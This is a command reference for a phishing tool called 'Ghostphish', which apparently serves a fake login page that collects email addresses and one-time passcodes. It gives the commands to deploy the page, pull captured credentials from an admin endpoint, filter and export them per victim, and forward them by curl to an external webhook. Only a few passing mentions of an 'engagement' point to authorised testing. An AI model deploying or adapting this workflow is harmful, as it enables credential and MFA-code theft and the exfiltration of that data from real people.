# Ghostphish - Quick Command Reference

## Docker Operations

### Start the tool
```bash
docker-compose up -d
```

### Stop the tool
```bash
docker-compose down
```

### View logs
```bash
docker logs ghostphish -f
```

### Rebuild container
```bash
docker-compose build --no-cache
docker-compose up -d
```

### Check container status
```bash
docker ps | grep ghostphish
```

## Access the Tool

### Open phishing page
```bash
open http://localhost:8000
# or
curl http://localhost:8000
```

### Get captured data (JSON)
```bash
curl http://localhost:8000/admin/captures
```

### Get captures with pretty formatting
```bash
curl http://localhost:8000/admin/captures | jq .
```

### Filter captures by email
```bash
curl http://localhost:8000/admin/captures | jq '.captures[] | select(.email=="user@example.com")'
```

### Count total captures
```bash
curl http://localhost:8000/admin/captures | jq '.captures | length'
```

## Data Management

### Export to JSON
```bash
python export_captures.py json
```

### Export to CSV
```bash
python export_captures.py csv
```

### View statistics
```bash
python export_captures.py stats
```

### Clear all captures (keeps database)
```bash
python cleanup.py clear
```

### Delete entire database
```bash
python cleanup.py delete
```

## Database Access

### Direct SQLite access
```bash
sqlite3 ./data/captures.db
```

### Common SQL queries

**View all captures:**
```sql
SELECT * FROM captures ORDER BY timestamp DESC;
```

**Get unique emails:**
```sql
SELECT DISTINCT email FROM captures;
```

**Count attempts per email:**
```sql
SELECT email, COUNT(*) as attempts FROM captures GROUP BY email ORDER BY attempts DESC;
```

**Get captures from specific IP:**
```sql
SELECT * FROM captures WHERE ip_address = '192.168.1.100';
```

**Get captures from last hour:**
```sql
SELECT * FROM captures WHERE datetime(timestamp) > datetime('now', '-1 hour');
```

**Export specific email to CSV:**
```bash
sqlite3 -header -csv ./data/captures.db "SELECT * FROM captures WHERE email='target@example.com';" > target_captures.csv
```

## Curl Examples

### Test with sample data
```bash
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "otp": "123456",
    "honeypot": ""
  }'
```

### Simulate bot attempt (honeypot field filled)
```bash
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -d '{
    "email": "bot@example.com",
    "otp": "123456",
    "honeypot": "filled"
  }'
```

### Health check
```bash
curl http://localhost:8000/health
```

### Clear captures via API
```bash
curl -X POST http://localhost:8000/admin/clear
```

## Monitoring

### Watch for new captures (real-time)
```bash
watch -n 1 'curl -s http://localhost:8000/admin/captures | jq ".captures[0]"'
```

### Monitor Docker stats
```bash
docker stats ghostphish
```

### Monitor database file size
```bash
watch -n 5 'ls -lh ./data/captures.db'
```

## Troubleshooting

### Check if port is in use
```bash
lsof -i :8000
# or
netstat -tlnp | grep 8000
```

### Kill process on port 8000
```bash
kill -9 $(lsof -ti:8000)
```

### Verify database integrity
```bash
sqlite3 ./data/captures.db "PRAGMA integrity_check;"
```

### Backup database before cleanup
```bash
cp ./data/captures.db ./data/captures_backup_$(date +%s).db
```

### View database schema
```bash
sqlite3 ./data/captures.db ".schema"
```

## Development

### Run without Docker (development)
```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python -m uvicorn app:app --reload --host 0.0.0.0 --port 8000
```

### Run on different port
```bash
python -m uvicorn app:app --host 0.0.0.0 --port 8001
```

### Enable debug logging
```bash
PYTHONUNBUFFERED=1 python -m uvicorn app:app --log-level debug
```

## Advanced

### SSH tunnel to remote ghostphish
```bash
ssh -L 8000:localhost:8000 user@remote-server
# Access at http://localhost:8000
```

### Deploy with reverse proxy (nginx)
```bash
# In nginx config:
location /ghostphish/ {
    proxy_pass http://127.0.0.1:8000/;
    proxy_set_header X-Forwarded-For $remote_addr;
}
```

### Scheduled backup
```bash
# Add to crontab
0 * * * * cp /path/to/ghostphish/data/captures.db /path/to/backup/captures_$(date +\%s).db
```

### Send captures to webhook
```bash
curl -X POST http://localhost:8000/admin/captures | \
  jq '.captures[]' | \
  curl -X POST https://your-webhook.com/phishing \
    -H "Content-Type: application/json" \
    -d @-
```

## Security Checks

### Verify no captures before test
```bash
curl http://localhost:8000/admin/captures | jq '.total'
```

### Export before engagement ends
```bash
python export_captures.py json && python export_captures.py csv
```

### Secure cleanup after testing
```bash
python cleanup.py delete
```

---

**Pro Tip**: Combine commands for automated workflows:
```bash
# Export, backup, then clean
python export_captures.py json && cp data/captures.db data/backup.db && python cleanup.py clear
```
